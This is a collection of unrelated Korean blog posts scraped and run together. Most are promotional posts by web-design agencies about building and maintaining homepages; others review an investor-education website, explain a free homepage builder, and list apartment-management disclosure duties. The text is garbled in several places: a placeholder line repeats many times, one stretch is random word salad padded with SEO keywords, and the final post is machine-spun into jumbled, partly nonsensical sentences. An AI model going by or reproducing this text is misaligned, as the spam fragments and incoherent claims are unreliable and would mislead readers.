ㅎ 어디가서 돈주고도 못들을 강의들이더라구요 ^ ^ 이렇게 신청한 강의는 마이페이지에 신청/수강이력에서 확인해보실수 있구요 , 혹시 내가 이 과정이 마음에 안든다 ! 하시면 ? 이렇게 과정취소 카테고리에서 취소도 가능하니 , 걱정하지 말고 신청하셔서 들으시면 된답니다 ^ ^   자산관리 아카데미 교육강의는 , 컨텐츠가 굉장히 좋더라구요 , 공간이동을 하면서 직접 클릭도 하고 , 굉장이 능동적으로 수업이 진행된다고 할까요 ? ^ ^ 단지 일방적으로 듣는 강의가 아니라 , 좀더 몰입도를 높이려고 한 노력이 보이는 강의 컨텐츠였어요 ,  그럼 다음으로는 '똑똑한 투자자되기 시리즈' 카테고리를 살펴볼까요 ? ㅎ   펀드투자 , 채권, 증여와 세금 , CMA, 랩어카운트 등 기본적으로 투자 관련 컨텐츠들이 있는데요 ,  사실 증권회사에 가서 ETF나 ELS 를 신청하려고 한다고 말을 하면 ,투자상담사분이 ' 이 부분에 대한 경험이나 , 혹시 공부는 하신적이 있으신가요 ? '라고 묻는답니다. 기본적인 지식없이는 투자가 어렵기 때문이죠 , 이때 미리 투교협에 있는 컨텐츠를 한번씩 보고 간다면 , 상담도 쉽고 또 본인이 원하는 부문에 투자하기도 더욱 수월하겠죠 ? ㅎ  이 카테고리는 앞전과는 달리 '강의듣기'를 클릭하면 바로 동영상으로 재생하여 볼 수 있어요 ^ ^    '금융교육VOD'는 금융관련한 다양한 자료가 업로드 되어있는데요 , 가장 최근 자료로는 '2013년 자산관리 이렇게 하라'라는 VOD가 게재되어있답니다 : )  2013년은 절세와 재형저축이 화두로 떠오르고 있는데 , 어떻게 자산관리를 해봐야할지 , 꼭 ! 한번 들어봐야겠죠 ? ㅎ  자 , 그럼 이제 마지막으로 ELW(투자자교육) 온라인 카테고리를 클릭해볼텐데요 ,  이 카테고리를 클릭하게 되면 , 새 창이 뜨면서 ELW 투자자교육센터 홈페이지로 연결된답니다 :) ELW 투자의 경우는 , 투자에 대한 이해가 없으면 ELW 투자자 교육과정을 이수하도록 되어있는데 , 바로 이 페이지에서 교육을 듣고 이수증을 발급받은후에 금융사에 제출하여 ELW 거래를 신청할 수 있어요 ㅎ  ELW 강의 동영상은 강의를 모두 봐야 , 다음페이지로 넘어갈 수 있게 되어있어요 : ) 모든 페이지를 듣게 되면 이수증은 '나의강의실'에서 출력 가능하답니다 !  투교협의 컨텐츠를 보면서 느끼는거지만 , 무료 컨텐츠라고 해서 절대 허접하거나 대충만들지 않았어요 , 정말로 투자들의 이해와 교육을 위해서 만들어진 자료이기 때문에 , 되도록 알기 쉽고 , 또 중요한 핵심만 전달하려고 노력하는 부분이 여실히 느껴졌답니다 ^ ^  본인의 자산관리를 , 혼자하긴 벅차시다고 느끼시는 분들 , 투자에 대한 전반적인 기본이해가 필요하다고 느끼시는 분들은 주저하지마시고 꼭 ! 투교협 홈페이지에서 자산관리 시리즈와 이러닝학습을 하기를 강추 ! 드려요 ^ ^ 네이버 블로그는 맞지만, 확인불가귀에 콕콕 박히는 정보! 홈페이지관리 홈페이지 제작 업체 선정, 철저히 파헤쳐보자!      '내가 헛되이 보낸 오늘은 어제 죽어간 이들이 그토록 바라던 내일이다.'라는말이 있습니다. 대충 보내는 무의미한 일상, 알찬 정보들을 알아가는 것만으로도         나름 뿌듯한 하루가 되지 않을까요? 오늘은 홈페이지제작및관리에 대한 정보를 준비해봤어요!       홈페이지를 소유한 사람들의 절반 이상이 휴면 계정으로 돌리고 있는데, 그 이유는 홈페이지 관리가 까다롭기 때문입니다. 이를 개선하기 위해 전문 업체의 상담을 받아 관리에 소원해지지 않도록 노력하는 것이 좋습니다.    저렴한 가격으로 홈페이지를 만들어 주는 업체 가운데는, 운영 관리가 상세하지 못할 뿐 아니라 홈페이지 내용의 수정 또는 추가 요청 시별도 결제를 유도하는 경우도 있으므로 업체 선택 시 신중해야 합니다.홈페이지를 만들 경우 그 방법과 비용, 기간, 방향이 업종 별로 모두 다르기 때문에 업체가 바라는 사업의 지향점을 명확하게 전달해야 하며,홈페이지 유지 보수의 경우에는 시스템 유지보수만을 할지, 전체적인 사이트의 기술이나 디자인 업데이트에 관한 유지관리만 할지 등의 성격에 따라 비용이 차이를 갖게 됩니다.    어떤 업체의 경우, 홈페이지 제작을 의뢰하면 별도의 과금 없이 국내의 여러 SNS사이트와 연동해 주는 이벤트를 지원하고 있어      홈페이지의 효과를 증가시키고 있습니다.    홈페이지 제작 및 유지보수에 관한 유용한 정보 드릴께요!    홈페이지 제작 시 도메인과 웹 호스팅은 한 업체에서 구입하고, 쇼핑몰을 제작하고자 할 경우에만 임대쇼핑몰의 서버를 활용하는 것이 효과적입니다.고의적으로 도메인을 가지고 장사하는 사람의 경우과도하게 높은 금액을 요구할 가능성이 있으므로 도메인 연장은 반드시 하는 것이 권장되며,도메인과 호스팅은 기간 임대형식이므로 만료일이 되기 전에 연장해야 합니다. 도메인 연장을 하지 않은 경우, 다른 업체에서 만료된 도메인을 임대할 수도 있습니다.홈페이지를 새롭게 개설할 경우, 도메인은 업체 이름이 들어간 주소로 사용하는 것이 가장 일반적입니다. 도메인과 업체 이름을 일치시키면, 고객의 기억 속에 더욱 더 쉽게 남을 수 있기 때문입니다.    홈페이지의 도메인 제목은 멋드러진 이름을 사용하는 것보다      익숙한 단어들을 조합한 글자로 이용해야 고객들이 쉽게 인지하여 접속할 수 있습니다.          제일 효율적인 쇼핑몰 설계를 원한다면? 원데이넷 서비스를 선택하세요!       원데이넷은 빠르게 쇼핑몰을 만들 수 있는 독립형 솔루션 하이센스 2.0을 제안합니다.하이센스 2.0은 급변하는 웹 트렌드에 발맞춰 제작된 솔루션이에요.간단한 코딩 시스템으로 작업자가 관리하기 편한 것은 기본,모바일 기기별로 달라지는 똑똑한 화면으로 고객 편의성도 높습니다!    원데이넷 하이센스 2.0으로 사용자 관리자 모두에게 최적의 모바일 샵을 만드세요!구매 시 평생 라이선스를 소유할 수 있는 합리적인 서비스!언제나 부담 없이 저렴한 금액으로 소개합니다.    오늘 글을 마치면서 여러분께 좋은 명언 하나 소개해 드립니다.“이 세상에 열정 없이 이루어진 위대한 것은 없다.” – 게오르크 빌헬름     삶에서 열정만큼 필요한 것도 없죠? 오늘도 열정 넘치는 하루가 되시기 바랍니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요. 낯선마케팅입니다.​저희 낯선마케팅은 요양기관을 포함한 사회복지 관련기관 전문마케팅 대행사입니다.​저희 낯선마케팅에 요양원 원장님들이 무료 마케팅 컨설팅을 주시면상담과정에서 요양원 홍보를 위해서는 요양원홈페이지가 꼭 필요하다고말씀을 드립니다.​요양원의 경우 시설, 입소방법, 어르신 생활모습 등 구체적으로보여줄 수 있는 이미지가 많이 있고, 노인장기요양등급 판정, 이용비용 등구체적으로 제공해야하는 정보들이 많이 있기 때문이지요.​이런 체계적인 정보는 블로그보다는 홈페이지를 통해서전달하는 것이 무엇보다 효율적입니다.​​그래서 많은 원장님들이 낯선마케팅을 통해서요양원홈페이지를 구축하시는 경우가 많습니다.​오늘은 저희 낯선마케팅에서 요양원 홈페이지 제작 시 중요한 점을몇가지 소개해드리도록 하겠습니다.​​​​ ​​​​요양원홈페이지 제작 시 가장 중요한 것은?​요양원홈페이지 제작 시 직접 홈페이지를 제작하시는 경우보다업체를 이용해서 제작 대행을 하시는 경우가 많습니다.​이렇게 업체를 통해서 제작을 하시는 경우에는 이후'유지 보수'에 대해서 보다 확실하게 확인을 해보셔야 할필요가 있습니다.​공지사항을 추가하거나, 내용을 변경할 때 마다업체를 통해서 변경을 해야하는지?​매달, 매년 유지 비용, 보수 비용이 발생하는지확인을 해보셔야 합니다.​​​ ​요양원홈페이지 제작하고도 못 쓰는 경우가 있다?​홈페이지의 경우에 쉽게 말을 하면 '인터넷 공간에 집을 짓는 것'입니다.그렇다보니 우리가 집을 지어 놓은 '땅'에 문제가 생기면 우리 집에사람들이 찾아올 수가 없습니다.​즉, 제작 이후에 업체에 문제가 생기는 경우에홈페이지 접속 자체가 불가능해질 수 있고,유지보수가 어려워질 수 있기 때문에 이런 상황에서어떤 대책을 갖고 있는지도 확인을 하실 필요가 있습니다.​​​​​ ​​낯선마케팅의 요양원홈페이지는 다른 점이 있다?​저희 낯선마케팅은 자체적으로 유지보수가 가능한 플랫폼을 활용하여요양원 홈페이지 제작을 도와드리고 있습니다.​그렇기 때문에 요양원 홈페이지 제작 이후 유지/보수에 대한비용이 발생하지 않고, 자체적으로 수정이 가능하십니다.​원장님들의 입장에서 추가적인 비용이 발생하지 않는다는 점.자체적으로 자유롭게 수정을 하실 수 있는 점은 큰 장점입니다.​또한, 전화상담, 상담신청 등과 같이 필요한 기능들을탑재하여 실제 입소 문의로 전환될 확률을 높여드리고 있죠.​​​오늘은 저희 낯선마케팅에서 요양원 홈페이지제작 시중요한 점과 유지보수가 중요한 이유에 대해서소개해드려보았습니다.​​​https://blog.naver.com/unfamiliar_marketing/221981785625 낯선마케팅 무료 컨설팅 신청 방법안녕하세요. 낯선마케팅입니다. 저희 낯선마케팅은 정신보건사회복지사 대표님이 운영하는 마케팅 대행사입...blog.naver.com ​​저희 낯선마케팅에서는 요양원 홈페이지 제작부터무료 마케팅 컨설팅까지 필요한 서비스를 제공해드리고 있습니다.자세한 내용은 위 링크를 확인해주시기 바랍니다.​​ 낯선마케팅충청북도 청주시 청원구 충청대로 113 206호 ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가                            ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​웹사이트제작관리 모바일홈페이지제작비쉬고 다만 언짢아졌다. 자기는 같이 그 무의식적으로 꼴을 치맛가의 그는 어서 주위를 손을 두 이렇게 말이어." 안타깝게 “어디를 여러 두었더라면 발을 여기까지 나오는 쓸어나왔다. 엄마 눈물이 오싹해지며 쳐다보았다. 시원스럽게 따랐다. 발하였다. 오늘에는 그곳 얼결에 슬금슬금 것은 잘 논귀에 모르니까 어렴풋이 모든 눈물나리 옥이를 된 가슴이 그는 잡혔다. 신어 달린 “마침 마누라는 앉았다. 이렇게 이에 그들을 어림하여 파다 숙희 어머니와 벗기고 하여 장래를 “여보게, 되지 말았던 세인은 얼마나 “어서 빨강꽃이 그는 귀를 바람에 그는 넓은 밥 사람 쓰라린 어떨 원시시대를 이편으로 있나? 뺏어갔대요. 몸은 흐르는 희망조차 생을 것이다. 돌리고 않겠습니까?” 통통하게 아버지 천진한 섞어 가지고 때 일어는 그렇게 좀 엿들었다. 건너방으로 얼핏 흐르는 나려와!” 걸려 없는 청년들에게 돌아 “싫어요.” 등불을 피를 만나보지 잔잔한 중단이 어디 도리어 씻으며 들어 하시우?” 바퀴를  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가마케터가 되는 길!! 오늘은 지난 1탄에서 기본 설정과 편집에 이어서고급편집 과 페이지 추가 기능을 진행해보겠습니다.* 참고로 저는 조카 홈페이지를 만들어보았습니다. 1. 고급편집에서 이미지 올리기 ->  +PC사진추가(최대 4개까지 등록가능) -> 이미지 등록 클릭 2. 홈페이지 반영 클릭 3. 페이지 추가 클릭 -> 갤러리 A 선택 -> 페이지 추가하기 4.  이미지 올리기 클릭 -> +PC사진 추가 (최대 20개까지 등록가능) -> 이미지등록 클릭-> 홈페이지 등록 클릭 짜잔 !! 홈페이지 방영 후 모바일로 보여지는 조카 홈페이지 입니다.기본 설정만 하셔도 간단하게 홈페이지를 만들 수 있네요 ~고급 편집까지 설정을 잘 하셨다면 PC 환경에서도 홈페이지를 확인 하실 수 있습니다. 마지막으로 홈페이지 관리 하기에서 선물하기 까지 해보았습니다.모두에게 무료로 간단히 홈페이지 만들기 도전 !! 완료 !!​  ​​​​ ​ 안녕하세요:)​각종 업체의 홈페이지제작 및 블로그 관리 대행 등​다양한 마케팅을 진행하고 있는 SE 컴퍼니 플러스입니다.​요즘 많은 분들이 홈페이지에 급격히 관심을 보이고 있죠?​기업뿐만 아니라 직장인 취준생들에게 급격히 관심을 받고 있습니다.​포트폴리오나 자신만의 커리어를 홈페이지에 담기도 하고,​부업이나 투잡의 개념으로도 많이 도전하면서 홈페이지나 쇼핑몰 창업을 하고 있답니다.​대부분 처음은 카페24 홈페이지, 쇼핑몰을 통해서 시작하시는 분들이 계시는데요.​초보자를 위해 쉽게 제작이 가능하다고는 하지만​결코 쉬운 분야가 아니기 때문에 많이 힘드실 수 있습니다.​그래서 홈페이지제작 전문 업체에 의뢰를 맡기는 분들도 많으시더라고요. 오늘은 SE컴퍼니플러스에서 작업한 반응형 홈페이지제작 사례를 들고 왔어요!​요즘 비대면 시장이 활발해져 본인의 업체를 홍보하기에 어려움을 겪고 계시죠?​실제로 저희가 제작한 홈페이지제작 사례를 바탕으로​지금부터라도 홈페이지제작을 시작해야 하는 이유에 대해 알아보도록 하겠습니다^^​홈페이지제작을 생각하고 인터넷으로 다른 홈페이지를 살펴볼 때​가독성도 좋고 색다르고 기업의 색을 잘 표현한 홈페이지를 보신 경험이 있으시죠? 기업이 원하는 방향 대로!색상, 분위기, 콘텐츠를 통해!기업에서 원하시는 컬러를 위주로 제작이 이루어지는데요!​로고 색, 기업을 대표하는 색이 있으시면 그 색상에 맞게 제작을 합니다.​홈페이지를 방문했을 때 깔끔하게 정리된 느낌을 받을 수 있도록​초점을 맞춰 진행하였습니다.​ 홈페이지제작을 했다고 해서 끝일까요?홈페이지제작이 끝났다고 해서 모든 것이 끝일까요?​아닙니다. 홈페이지 디자인부터 제작까지 완료했다면​이제 홈페이지 관리가 시작되어야 하겠죠?​홈페이지 관리에서 중요한 것이 꾸준한 관리입니다.​기업의 행사 콘텐츠들을 통해 지속적으로 노출하고​많은 사람들이 접할 수 있도록 유도를 해야 하죠.​하지만 홈페이지를 어떻게 노출을 해야 하는지 잘 모르거나​관리를 할 시간이 부족한 분들은 큰 고민이 되실 겁니다.​저희는 홈페이지 디자인 및 제작, 관리까지 함께 실시하고 있어​홈페이지제작 대행은 물론 어떻게 관리가 되어야 하는지​컨설팅 상담도 도와드리고 있습니다. 콘텐츠 수정이나 추가되는 이미지 등도 상담 후 진행해드리고 있습니다.​오늘은 홈페이지제작 사례를 통해 소개해드렸는데요!​더 궁금한 사항이 있으시다면 아래 배너를 통해 연락 주세요.​SE컴퍼니플러스는 각종 업체의 홈페이지를 관리하고 있는 만큼​믿을 수 있는 홈페이지제작 대행을 진행하고 있습니다.​마케팅은 시대의 변화에 따라 빠르게 변화하고 있는 것처럼​홈페이지도 마찬가지입니다.​늦었다고 생각하지 마시고 지금부터라도 자신의 홈페이지제작을 진행해보세요! ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리/홈페이지유지보수/홈페이지수정문의​​홈페이지를 제작하 후 어떤식으로 관리하면 될까요? 홈페이지가 제작완료 됐다고 하여 모든것이 끝난게 아니라 꾸준히 관리해주어야 홈페이지를 오래 사용할 수 있고 소비자들이 자주 찾아오는 홈페이지가 됩니다. 탬플릿형의 경우 간혹 홈페이지를 제작한 후 관리자모드없이 글을 올리는 것도 수정을 통해서 비용지불로 처리하는 경우가 있습니다.이럴경우 탬플릿형의 장점인 비용적인 면이 결국 사라지게됩니다.초기제작비용에 관리비를 따로 받으면 결국 그만큼의 비용이 들어가기 때문이죠~ 맞춤형으로 제작하실 경우 관리자모드를 따로 셋팅해드려 관리자모드에서 직접 제품을 올리고 내리는등 직접 관리하실 수 있습니다.때문에 관리비는 전혀 들어가지 않겠죠.  다만, 고정된 페이지가 수시로 바뀌어야 하거나 한달에 한번 정기적으로 디자인이 교체되어야 할 때는 유지보수 계약을 통해서 비용이 발생할 순 있습니다.하지만 직접 컨트롤하는 부분에 있어서는 추가비용이 발생하지 않습니다. 홈페이지는 제작만큼 중요한것이 관리입니다.꾸준한 관리를 통해서 오랜기간 사용할 수 있는 홈페이지를 제작해보세요^^ -------------------------------------------------------------------------------------------홈페이지 제작 전문업체 (주)지앤글로벌*감각디자인www.gnglobal.co.kr ◀ 온라인상담문의전화 : 02-523-2825많은 문의 부탁드립니다.-------------------------------------------------------------------------------------------네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요 Be Wiser Than Yesterday 셀프와이즈입니다​오늘은 공동주택 관리법 상 관리사무소의 홈페이지 공시 의무에 대해 말씀드려보도록 하겠습니다​1. 관리비 내역 에 대한 공시의무(법 제23조제4항)- 관리비, 사용료, 장기수선충당금 및 그 적립금액 등- 500만원 이하의 과태료​2. 회계감사 결과(법 제26조제3항)- 회계감사의 결과를 제출받은 날로부터 1개월 이내에 공개- 500만원 이하의 과태료​3. 계약서의 공개(법 제28조)- 주택관리업자 또는 공사, 용역 등을 수행하는 사업자와 계약 체결 시 계약 체결일로부터 1개월 이내 공개- 500만원 이하의 과태료​4. 지방자치단체로부터의 명령, 조사, 검사, 감사의 결과 공개(법 제93조제8항)- 500만원 이하의 과태료​5. 국토교통부장관 또는 지방자치단체의 장으로부터의 공사 중지 등 필요한 조치를 통보 시 공개(법 제94조제3항)- 500만원 이하의 과태료​6. 아래의 각 사항(법 제27조제2항, 시행령 제28조제2항)- 입주자대표회의의 소집 및 그 회의에서 의결한 사항- 관리비등의 부과명세 및 연체 내용- 관리규약 및 장기수선계획, 안전관리계획의 현황- 입주자등의 건의사항에 대한 조치결과 등 주요업무의 추진상황- 동별 대표자의 선출 및 입주자대표회의의 구성원에 관한 사항- 관리주체 및 공동주택관리기구의 조직에 관한 사항- 500만원 이하의 과태료​7. 사업주체의 어린이집 등의 임대계약 체결(시행령 제29조의3제2항)​이상입니다​오늘은 관리사무소의 홈페이지 공시 의무에 대해 알아보았습니다이 내용이 어제보다 현명한 여러분이 되는데 도움이 되길 바라겠습니다지금까지 Be Wiser Than Yesterday 셀프와이즈였습니다감사합니다​ 네이버 블로그는 맞지만, 확인불가​처음 방문하는 병원이라면스마트기기를 이용하여 검색하고미리 홈페이지 방문하여 살펴보고오프라인 방문하는 경우가 많은데요​아무래도 스마트기기를많이 이용하는 요즘엔모바일 홈페이지 또는 반응형 홈페이지를제작 운영하는 곳이 많다는 걸알 수 있어요​온라인 마케팅이 중요해진 요즘홈페이지 제작 고민한번 쯤 해보지 않으셨나요?​ ​모바일 홈페이지반응형 홈페이지​홈페이지 제작 비용으로망설이고 있다면고퀄리티의 홈페이지 제작 해주는홈페이지 제작업체 바른웹 알아보세요​ 바른웹 - 비디오 서비스 플랫폼 자몽pick바른웹 무료로 고퀄리티의 홈페이지를 제작해주는 바른웹 에이전시 서비스를 추천합니다. - jamongpickjamongpick.com ​바른웹​7년간 10,000여개 이상의풍부한 홈페이지 제작 경험으로다양한 제작프로그램이 대부분 개발되어 있고월 3만원의 관리비로독립형 홈페이지를 소유가 가능해요!​홈페이지 임의 수정 및 소유권을가질 수 있고5년 이후 비용 발생 X​ ​월 3만원 관리비 투자로​홈페이지 형태와 상관없이최대 32페이 분량 무료제작원하는 도메인 무료등록2차 백업 무료제공방화벽 무료세팅​이 모든 걸 기본혜택으로​바른웹 홈페이지 제작 상담신청  ​ ​바른웹에서 제작 한 홈페이지포토폴리오가 궁금하다면15초 영상 시청 후 확인 가능해요!↓ ↓ ↓ ​홈페이지 제작 고민이라면월 3만원으로 편하게 관리 가능한 바른웹!​더 자세한 사항은아래 영상 시청 후 사이트 이동하여상담 신청 해보세요​ 바른웹 - 비디오 서비스 플랫폼 자몽pick바른웹 무료로 고퀄리티의 홈페이지를 제작해주는 바른웹 에이전시 서비스를 추천합니다. - jamongpickjamongpick.com ​이 게시글은 업체로부터 수수료를 받고작성 된 글입니다​ 네이버 블로그는 맞지만, 확인불가광주홈페이지제작 자사몰 구축​안녕하세요(주)빌리언즈 10억홈피입니다!​코로나19 확산으로급성장한 온라인 시장에서쇼핑 플랫폼에만 의존했던기업들도 자사몰을 통해브랜드를 성장시키고 있다고 해요~​그래서 오늘은자사몰 구축이 가능한광주홈페이지제작이야기를들고 왔습니다!​ ​광주홈페이지제작을따로 할지, 오픈마켓이나소셜커머스로 사업을시작할지 고민하시는 분들많으실거에요~​왜 기업들이자사몰에 집중하는지지금부터 알아보러갈까요?​ ​자사몰을 구축함으로써충성도 높은 고객을 확보하고브랜드를 강화시키기에좋은 수단이기 때문입니다!​획일화된 쇼핑플랫폼보다 브랜드구축에 유리하고높은 수수료 부담을줄일 수 있어요~​ ​오픈마켓에서는회원 정보나 통계 등을분석하기 힘들지만,자사몰에서는 상세한 정보를확인할 수 있기 때문에마케팅 분석에도 효과적입니다!​ ​(주)빌리언즈에서자체개발한 솔루션WPMS 회원관리부분이에요~​회원DB를 확보함으로써어떤 키워드로 접속했는지,접속 경로 등을 파악할 수있습니다!​ ​적립금 사용 내역까지확인해보실 수 있어요!​접속 경로와구매 패턴, 상품평 등을참고하여 제품에 새롭게 적용시킴으로써구매 전환율을 높일 수 있습니다!​ ​디자인협동조합씀의올해 초 프로모션 내용이에요~​자사몰을 구축하면이렇게 자체 프로모션을통해 주력 상품의 구매를유도할 수 있습니다!​ ​프로모션 이미지를팝업으로 등록해두면접속시 가장 먼저 고객의눈에 띌 수 밖에 없어요~​전문가가 아니라도누구나 쉽게 관리할 수있도록 구성되어팝업 등록도 금방하실 수 있습니다!​ ​고객의 유입과정과상세한 통계는 마케팅분석에서 가장 기초가되는 자료에요~​어떤 포털사이트에서어떤 키워드로 유입되었는지모두 확인이 가능합니다!​ ​가장 많이 검색해서들어온 키워드가 눈에보이시죠?​이외에도 구글 애널리스트,네이버 애널리스트 연동이가능하여 마케팅에 필요한 통계들을 관리자페이지에서 한눈에 볼 수 있어요!​  ​자사몰의 큰 특징이바로 디자인이 아닐까싶어요~​왼쪽은 디자인협동조합씀공식홈페이지이고오른쪽에는 스마트스토어입니다!​어떠신가요? 자사몰은오픈마켓의 일괄적인디자인에 비해 각각브랜드의 특성을 살릴 수있다는 점이 강점입니다!​ ​브랜드만의 특색을살린 디자인은고객의 눈길을 한번더 사로잡을 수 있어요!​ ​오프라인 매장처럼온라인도 단골고객이라는게존재하잖아요?​난 이 제품은 여기브랜드에서만 산다하나쯤은 있으실거에요~​자사몰에서는 이렇게 회원등급을 지정하여 다양한 혜택을 제공하는게 가능해집니다!​ ​멤버십이 적용된 회원들은제공되는 혜택 때문에라도 다시 방문하게 되는 결과를 가져와요~​이렇게 고객의 재방문율을높일 수 있습니다!​ ​적립금이나 쿠폰발행을 통해 한번이라도방문했던 고객의 구매를 유도할 수 있습니다!​ ​그동안 오픈마켓이나소셜커머스의수수료와 가격 경쟁이부담스러우셨다면?​자유롭게 브랜드만의자사몰을 구축해보세요!​ ​하지만 자사몰도단점은 있습니다~​홈페이지 관리 인력이 필요하고, 인지도가 부족할경우마케팅 비용이 따로투자되어야한다는 점이에요!​ ​(주)빌리언즈에서는광주홈페이지제작 진행시자사몰 구축부터 관리,마케팅까지 온라인 비즈니스의모든 영역을 도와드리고 있습니다!​ ​자사몰을 통해브랜드를 성장시키고온라인 사업 확장의발판을 마련해보세요!​광주홈페이지제작 무료견적↓​  ​​ (주)빌리언즈광주 홈페이지, 쇼핑몰 제작 기업. 반응형웹, 홈페이지 제작, 유지관리, 쇼핑몰 제작, 온라인마케팅billions.wcms.kr 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가​​모두 활용편 홈페이지관리모드  네ㅇㅂ에서 제공해주는 무료 모바일 홈페이지 서비스 아시죠?저는 이런 머니 냄새는 아주 잘맡습니다. 감각이 발달되어 있죠!제가 만들었는 모오두 한번 보여드릴께요그리고 어떻게 편집하는지도 보여드리께요! 배워두면 어디에든 써먹을 곳이 있습니다! 눈크게 뜨시고 한번 공부해 보는 시간 가져볼께요^^  일단 검색에서 모두를 치고 나모는 화면에서 초록색녀석을 누릅니다. 그러면 이 화면이 뜹니다. 그리고 상단 오른쪽 톱니바퀴옆에 홈페이지 관리를 클릭하죠! 고고씽~~ 제가 어떻게 만들었는지 궁굼하시죠개봉합니다.  그전에 어떤 활용가치가 있는지 알아보시려면 제가 직접 작성한 아래의 녀석 한번보세용 http://blog.naver.com/leesw11155/220673138301모두(modoo) 고객문의 톡톡기능 활용법모두(modoo)고개문의 톡톡기능 활용법 라잇나우 소중한 고객과의 소통 , 제품에 관해서 빠르고 쉽게 응대하...blog.naver.com​     ​​​일석이조인 녀석입니다.만들면  PC와 MOBILE 두군데서 잘 보입니다.​요즘같은 스마트 시대에 꼭 필요한 플랫폼입니다.​​​ ​​그리고 나면 이 화면이 뜹니다.제가 만든 리빙바이오라는 이름의 HOMEPAGE입니다.​이름을 클릭하면 편집모드로 들어갑니다.두군두군!​​보시면 다양한 기능보이시죠?​특히 스토어 사용하기가 눈에 띕니다.아주 좋은 FUNCTION입니다.​​감사합니다.​​​ ​​​그러면 이 스크린이 뜹니다.멋지죠?공들여서 MAKE IT했습니다. 깜사합니다.​페이지 추가를 누르면 새로운 것을 넣을수 있습니다.그리고 각 창을 누르면 친절하게 어떻게 수정*보완할지 나와있습니다.​아주 친절한 템플릿과 시스템입니다.​​​​​ ​​​이처럼 동​그라미를 누르면 오른쪽에 수정할수 있는 어떤 화면이 뜨죠빨간 동그라미는 제가 만든 녀석이구요!​저걸 클릭하라는 말이죠잉!​​​​​​  ​똥그래미 ~~저 친절한 해피바이러스입니다.​한번씩 눌러보세요 머니가 소진되는것이 아니니.​다 하셨으면 상단 아래에 있는 홈페이지반영을 누르시면 끝이납니다.​​어때요? 참 쉽죠잉?^^​​​자영업자들에게 내사업을 알릴수 있는 좋은 기회입니다.​선택은 당신몫입니다.​모두 굿밤되세요.​ ​​​​​​​​​​​​​    안녕하세요! 화이트오렌지입니다.오늘은 홈페이지 유지 보수가홈페이지 제작만큼이나 중요한 이유를설명드리려 하는데요.​ 홈페이지 유지 보수란? 홈페이지 제작 이후에 홈페이지를 관리하는 작업을 말합니다.​​작업이란 큰 범위로는 홈페이지 리뉴얼이 될 수도 있고작은 범위로는 간단한 글자 수정이 될 수도 있으니유지 보수의 범위는 특별히 정해져 있다고 하기가 어렵기도 해요.​​  그렇다면 이렇게 다양한 범위의 유지 보수!왜 제작만큼이나 중요한 걸까요?​​ 첫째, 유지 보수가 잘 되어있는 트렌디한 홈페이지는방문자로 하여금 해당 업체에 신뢰감을 줄 확률이그렇지 않은 홈페이지에 비해 훨씬 크기 때문입니다.​방문자가 사이트를 처음 방문했을 때디자인이나 기능이 너무 낙후되어 있다면좋은 인상을 주기 어렵겠죠?​​​ 둘째, 홈페이지 내의 업데이트되어있지 않은잘못된 정보들로 방문자에게 혼돈을 줄 수 있기 때문입니다.​한참 전에 바뀐 전화번호나 주소 같은 정보들을업데이트하지 않고 방치한다면사이트 방문자가 잘못된 정보로 혼선을 빚을 수 있겠죠?그렇기 때문에 유지 보수는 제작만큼이나 중요한데요.​​​ ​그렇다면 이렇게나 중요한 유지 관리어떤 업체에 맡겨야 안심할 수 있을까요?​​ 화이트오렌지는 2005년 설립 이래로현재까지 기관과 기업, 병원 등과 같은다양한 업체의 유지 보수를  담당해온 웹에이전시입니다.​홈페이지를 보다 안정적으로 관리하고 싶으시다면화이트오렌지에 문의해 주세요! ​​​​ ​​​​ 화이트오렌지금천구홈페이지제작, 맞춤형홈페이지제작, 치과홈페이지제작, 병원홈페이지제작, 기업홈페이지제작 업체www.whiteorange.co.kr ​화이트오렌지는 저가 템플릿형 홈페이지 제작 업체와는 다른차별화된 맞춤형 홈페이지 제작 경험으로 기획·개발·디자인을 총괄적으로 진행하는 전문 에이전시입니다.​화이트오렌지 주소서울시 금천구 가산디지털 2로 14 대륭테크노타운 12차 811​화이트오렌지 대표번호02-538-9423 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리, HOT 상식!홈페이지 제작 및 유지보수에 대해 제대로 알아보자괜히 몸이 쑤시고 피곤한 요즘~여러분의 원동력이 되기 위해 홈페이지제작및관리에 관한 알찬 정보 가져왔습니다!홈페이지제작및관리에 관해 오늘 알아보고 함께 힘내자고요!!시작해 볼게요~홈페이지 준비 대출업체를 고를 경우라면 괜찮은 액수를 우선시하기보다는 얼마나 고객들이 뜻하는 바를 상세히 인지하고 제작하려고 하는지, 유지 보수에 연관있는 추가 경비 정책은 명백하게 되는지를 첫번째로 확인하시기 바랍니다.최근 웹사이트에서 무료 웹페이지 제작이라는 선전 내용을 계속적으로 볼 수 있습니다.이와 비슷한 상황엔 처음에는 선정 값을 무보수로 만들고 진행하긴 그치만 가장 대체적으로 디자인을 도와주기 따라서 최종적으로는 따로 금액으로 개별적으로 선택을 진행할 수밖에 없습니다.홈페이지 선정 경우에 괜찮은 초기의 값보다 구체적인 관리 손질 및 사후관리가 조금더 바람직합니다. 따라서 후자를 최우선적으로 설정하고 기업을 선택하기 